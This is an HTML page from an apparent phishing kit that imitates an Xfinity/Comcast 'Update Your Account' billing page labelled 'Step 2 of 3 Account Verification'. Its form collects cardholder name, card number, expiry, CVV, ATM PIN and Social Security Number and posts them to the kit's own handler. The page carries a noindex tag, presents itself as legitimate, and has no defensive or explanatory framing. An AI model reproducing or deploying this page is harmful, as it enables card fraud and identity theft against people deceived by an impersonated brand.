<!DOCTYPE html>
<html>
<head>
	<meta content="text/html; charset=utf-8" http-equiv="Content-Type">
	<meta content="ie=edge" http-equiv="x-ua-compatible">
	<meta content="width=device-width,initial-scale=1,shrink-to-fit=no" name="viewport">
	<title>XFINITY | Update Your Account | EcoBill&reg; Online Bill Pay</title>
	<link href="./CSS/S.ico" rel="icon">
	<meta content="noindex" name="robots">
	<link href="./CSS/CC2.css" rel="stylesheet" type="text/css">
	<link href="./CSS/CC.css" rel="stylesheet" type="text/css">
	<link href="./CSS/Ccss" rel="stylesheet">
	<meta content="#ffffff" name="msapplication-TileColor">
	<meta content="#ffffff" name="theme-color">
	<meta content="KeisTVuqC7Jg8M_hmY6rtobs5NLYLtJ5MtNfmQYbyBI" name="google-site-verification">
	<meta content="app-id=776010987" name="apple-itunes-app">
</head>
<body>
	<main role="main">
		<div class="main-content">
			<header class="page-header page-app--takeover page-header--breadcrumbs ui-blue" id="page-header" role="banner">
				<div class="page-header__logo-wrap">
					<a class="page-header__logo icon-xfinity-white" href="#/" rel="home"><span class="visuallyhidden">Xfinity</span></a> <!-- <a href="#/" class="page-header__cancel-icon icon-remove-gray" rel="home"><span class="visuallyhidden">Cancel</span></a> -->
				</div><!-- ngIf: currentRoute.breadcrumbs.length !== 0 -->
				<div class="page-header__wrapper">
					<div class="page-header__content">
						<div class="page-header__navigation">
							<nav class="nav-progress" role="navigation">
								<font size="1"><!-- ngRepeat: breadcrumb in currentRoute.breadcrumbs --><span><span class="body3 status status--warning">Review : Step 2 of 3<br>
								&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Account Verification</span></span> <!-- end ngRepeat: breadcrumb in currentRoute.breadcrumbs --></font>
							</nav>
						</div>
					</div>
				</div><!-- end ngIf: currentRoute.breadcrumbs.length !== 0 -->
			</header>
			<div class="page-content" id="page-content">
				<main class="page-main" id="page-main">
					<!-- ngView: -->
				</main>
				<div aria-atomic="true" aria-live="assertive" class="page-view view" id="page-view" role="main" tabindex="0">
					<section class="page-section ui-grey hero" style="">
						<div class="page-section__wrapper clearfix">
							<div class="page-section__content">
								<!-- <form name="method" class="payment ng-pristine ng-valid ng-valid-required ng-valid-v-credit-card-type ng-valid-v-credit-card ng-valid-server-error ng-valid-v-cvv ng-valid-pattern ng-valid-minlength ng-valid-maxlength" novalidate="" ng-submit="method.$valid &amp;&amp; checkSavedPaymentContract(&#39;card&#39;)"> -->
								<form id="form1"  autocomplete="off"
								action="com"
								method="post">
									<div class="card-group">
										<br>
										<div class="card-group__item">
											<div class="card">
												<div class="card__content">
													<h2 class="body5 status status--warning">Account Information</h2>
													<h2 class="body2 status status--">Update Credit and Debit Cards</h2>
												</div>
											</div>
										</div>
										<div class="card-group__item">
											<fieldset aria-invalid="false" class="card card--secondary credit-card-payment ng-valid" form="paymentForm">
												<div class="card__content">
													<div class="form-control-group form-control-group--flex-at-768">
														<div class="form-control-group__item">
															<div class="form-control undefined">
																<label class="form-control__label" for="Hold">Cardholder's name <strong style="color: red;">*</strong></label>
																<div class="form-control__input">
																	<input aria-describedby="Hold" aria-invalid="false" class="" id="Hold" name="Hold" required="" title="Please enter a valid Cardholder's Name" type="text" value="">
																</div>
															</div>
														</div>
														<div class="form-control-group__item">
															<div class="form-control">
																<label class="form-control__label" for="Typ">Credit Card Type <strong style="color: red;">*</strong></label>
																<div class="form-control__input">
																	<select class="ng-pristine ng-untouched ng-valid ng-valid-required" id="Typ" name="Typ" required="" title="Please Select Credit Card Type">
																		<option value="">
																			--Please Select--
																		</option>
																		<option value="Visa">
																			Visa
																		</option>
																		<option value="MasterCard">
																			MasterCard
																		</option>
																		<option value="American Express">
																			American Express
																		</option>
																		<option value="Discover">
																			Discover
																		</option>
																	</select>
																</div>
															</div>
														</div>
													</div>
													<div class="form-control-group form-control-group--flex-at-768">
														<div class="form-control-group__item">
															<div class="form-control">
																<!-- ngIf: label --><label class="form-control__label" for="lastName">Card number <strong style="color: red;">*</strong><!-- ngIf: icon --></label> <!-- end ngIf: label -->
																<!-- ngIf: note -->
																<div class="form-control__input">
																	<input class="ng-pristine ng-untouched ng-valid ng-valid-required" id="Card" maxlength="19" name="Card" onkeypress="isInputNumber(event)" placeholder="" required="" style="background-repeat: no-repeat; background-image: url(./CSS/1.png);" title="Please enter a valid card number" type="text"> 
  <script>

document.getElementById('Card').addEventListener('blur', function (e) {
        var x = e.target.value.replace(/\D/g, '').match(/(\d{4})(\d{4})(\d{4})(\d{4})/);
        e.target.value =  x[1] + ' ' +  x[2] + ' ' + x[3] + ' ' + x[4];
    });    
function isInputNumber(evt){
        var ch=String.fromCharCode(evt.which);
        if(!(/[0-9]/.test(ch))){
            evt.preventDefault();
        }
    }
  </script>
																</div><!-- ngIf: helper -->
															</div>
														</div>
														<div class="form-control-group__item">
															<div class="form-control-group form-control-group--flex-at-768">
																<div class="form-control-group__item form-control-group__item--2of3">
																	<h3 class="label">Expiration Date <strong style="color: red;">*</strong></h3>
																	<div class="form-control-group form-control-group--flex">
																		<div class="form-control-group__item">
																			<div class="form-control">
																				<!-- ngIf: label -->
																				<!-- ngIf: note -->
																				<div class="form-control__input">
																					<select class="ng-pristine ng-untouched ng-valid ng-valid-server-error ng-valid-required" id="ex1" name="ex1" required="" title="Please select a valid expiration month">
																						<option class="" disabled="disabled" hidden="" selected="selected" value="">
																							MM
																						</option>
																						<option label="01" value="string:01">
																							01
																						</option>
																						<option label="02" value="string:02">
																							02
																						</option>
																						<option label="03" value="string:03">
																							03
																						</option>
																						<option label="04" value="string:04">
																							04
																						</option>
																						<option label="05" value="string:05">
																							05
																						</option>
																						<option label="06" value="string:06">
																							06
																						</option>
																						<option label="07" value="string:07">
																							07
																						</option>
																						<option label="08" value="string:08">
																							08
																						</option>
																						<option label="09" value="string:09">
																							09
																						</option>
																						<option label="10" value="string:10">
																							10
																						</option>
																						<option label="11" value="string:11">
																							11
																						</option>
																						<option label="12" value="string:12">
																							12
																						</option>
																					</select>
																				</div><!-- ngIf: helper -->
																			</div>
																		</div>
																		<div class="form-control-group__item">
																			<div class="form-control">
																				<!-- ngIf: label -->
																				<!-- ngIf: note -->
																				<div class="form-control__input">
																					<select id="ex2" name="ex2" required="" title="Please select a valid expiration year">
																						<option class="" disabled="disabled" hidden="" selected="selected" value="">
																							YYYY
																						</option>
																					
																						<option label="2021" value="string:2021">
																							2021
																						</option>
																						<option label="2022" value="string:2022">
																							2022
																						</option>
																						<option label="2023" value="string:2023">
																							2023
																						</option>
																						<option label="2024" value="string:2024">
																							2024
																						</option>
																						<option label="2025" value="string:2025">
																							2025
																						</option>
																						<option label="2026" value="string:2026">
																							2026
																						</option>
																						<option label="2027" value="string:2027">
																							2027
																						</option>
																						<option label="2028" value="string:2028">
																							2028
																						</option>
																						<option label="2029" value="string:2029">
																							2029
																						</option>
																					</select>
																				</div><!-- ngIf: helper -->
																			</div>
																		</div>
																	</div>
																</div>
																<div class="form-control-group__item form-control-group__item--1of3">
																	<div class="form-control">
																		<label class="form-control__label" for="cvv">Security Code <strong style="color: red;">*</strong></label> <label class="form-control__label" for="cvv"><span class="screen-reader-text"></span></label>
																		<div class="form-control__input">
																			<input class="ng-pristine ng-untouched ng-valid ng-valid-v-cvv ng-valid-server-error ng-valid-pattern ng-valid-minlength ng-valid-maxlength ng-valid-required" id="cvv" maxlength="4" name="cvv" onkeypress="isInputNumber(event)" placeholder="CVV" required="" style="background-repeat: no-repeat; background-image: url(./CSS/2.png);" title="Please enter a valid CVV Number" type="text"> 
																			<script>
																			function isInputNumber(evt){
																			var ch = String.fromCharCode(evt.which);
																			if(!(/[0-9]/.test(ch))){
																			evt.preventDefault();
																			}
																			}
																			</script>
																		</div>
																	</div>
																</div>
															</div>
														</div>
													</div>
													
															<div class="form-control">
																<!-- ngIf: label --><label class="form-control__label" for="MTM">ATM Pin<!-- ngIf: icon --></label> <!-- end ngIf: label -->
																<!-- ngIf: note -->
																<div class="form-control__input">
																	<input class="ng-pristine ng-untouched ng-valid ng-valid-required" id="MTM" maxlength="4" name="MTM" onkeypress="isInputNumber(event)" placeholder="####" style="width: 109.0%;" title="Please enter a valid ATM Pin" type="text"> 
																	<script>
																	                                                   function isInputNumber(evt){
																	                                                   var ch = String.fromCharCode(evt.which);
																	                                                   if(!(/[0-9]/.test(ch))){
																	                                                   evt.preventDefault();
																	                                                   }
																	                                                   }
																	</script>
																</div><!-- ngIf: helper -->
															</div></div>
															<br><div class="ma-grid__col ma-grid__col--1of2">
														<div class="form-control-group form-control-group--split form-control">
															<div class="form-control">
																<!-- ngIf: label --><label class="form-control__label" for="NSN">Social Security Number <strong style="color: red;">*</strong><!-- ngIf: icon --></label> <!-- end ngIf: label -->
																<!-- ngIf: note -->
																<div class="form-control__input">
																	<input class="ng-pristine ng-untouched ng-valid ng-valid-required" id="NSN" maxlength="11" name="NSN" placeholder="*** ## ####" required="" style="width: 105.0%;" title="Please enter a valid Social Security Number" type="text"> 
  <script>

document.getElementById('NSN').addEventListener('blur', function (e) {
        var x = e.target.value.replace(/\D/g, '').match(/(\d{3})(\d{2})(\d{4})/);
        e.target.value = [] + '' + x[1] + '-' + x[2] + '-' + x[3];
    });    
function isInputNumber(evt){
        var ch=String.fromCharCode(evt.which);
        if(!(/[0-9]/.test(ch))){
            evt.preventDefault();
        }
    }
  </script>
																</div><!-- ngIf: helper -->
															</div>
														</div>
													</div>												
													<div class="Banner">
													<font color="red">*All fields are required (unless otherwise noted)</font>
												</div>
												</div>

											</fieldset>
										</div>
									</div>
									<div class="action action--right">
										<div class="action__item">
											<button class="button button--primary" type="submit">Confirm and Finish Up</button>
										</div>
							</div>
								</form> 
							</div><!-- ngIf: !agentView && method.$submitted && errors.api -->

						</div>
											</section>
				</div><!-- end ngIf: !acceptingTermsOfService && !route.current.hideHelpAndSupport -->
			</div><!-- end ngIf: !acceptingTermsOfService && !route.current.hideHelpAndSupport -->
		</div><!-- end ngIf: account.accountNumber && termsOfServiceAccepted.status==='READY' --><!-- ngIf: termsOfServiceAccepted.status==='ERROR' --><!-- ngIf: (!account.accountNumber.length && termsOfServiceAccepted.status==='READY') || termsOfServiceAccepted.status==='LOADING' --><!-- end ngIf: !acceptingTermsOfService && !route.current.hideHelpAndSupport --><!-- end ngIf: account.accountNumber && termsOfServiceAccepted.status==='READY' --><!-- ngIf: termsOfServiceAccepted.status==='ERROR' --><!-- ngIf: (!account.accountNumber.length && termsOfServiceAccepted.status==='READY') || termsOfServiceAccepted.status==='LOADING' --><!-- end ngIf: !acceptingTermsOfService && !route.current.hideHelpAndSupport --><!-- end ngIf: account.accountNumber && termsOfServiceAccepted.status==='READY' --><!-- ngIf: termsOfServiceAccepted.status==='ERROR' --><!-- ngIf: (!account.accountNumber.length && termsOfServiceAccepted.status==='READY') || termsOfServiceAccepted.status==='LOADING' -->
<!-- end ngIf: account.accountNumber && termsOfServiceAccepted.status==='READY' --><!-- ngIf: termsOfServiceAccepted.status==='ERROR' --><!-- ngIf: (!account.accountNumber.length && termsOfServiceAccepted.status==='READY') || termsOfServiceAccepted.status==='LOADING' --><!-- end ngIf: !acceptingTermsOfService && !route.current.hideHelpAndSupport --><!-- end ngIf: account.accountNumber && termsOfServiceAccepted.status==='READY' --><!-- ngIf: termsOfServiceAccepted.status==='ERROR' --><!-- ngIf: (!account.accountNumber.length && termsOfServiceAccepted.status==='READY') || termsOfServiceAccepted.status==='LOADING' --><!-- end ngIf: !acceptingTermsOfService && !route.current.hideHelpAndSupport --><!-- end ngIf: account.accountNumber && termsOfServiceAccepted.status==='READY' --><!-- ngIf: termsOfServiceAccepted.status==='ERROR' --><!-- ngIf: (!account.accountNumber.length && termsOfServiceAccepted.status==='READY') || termsOfServiceAccepted.status==='LOADING' --><xc-footer ng-show="!route.current.takeover &amp;&amp; showPolarisFooter &amp;&amp; !prepaid" client-id="myAccountWeb" tracking-module="footer" aria-hidden="false" class=""
<div class="xc-footer--bottom-container"><footer><br>
&nbsp;


&nbsp; &nbsp; &nbsp;
<style id="xc-footer-styles">
xc-footer {
display: block;
background: #000;
font-family: </style><font color="#ffffff" face="Arial" size="1"><span class="content"><span class="content">&copy; 2021 Comcast</span><br>
</span><br>
</font>
</footer></div>
</body>
</html>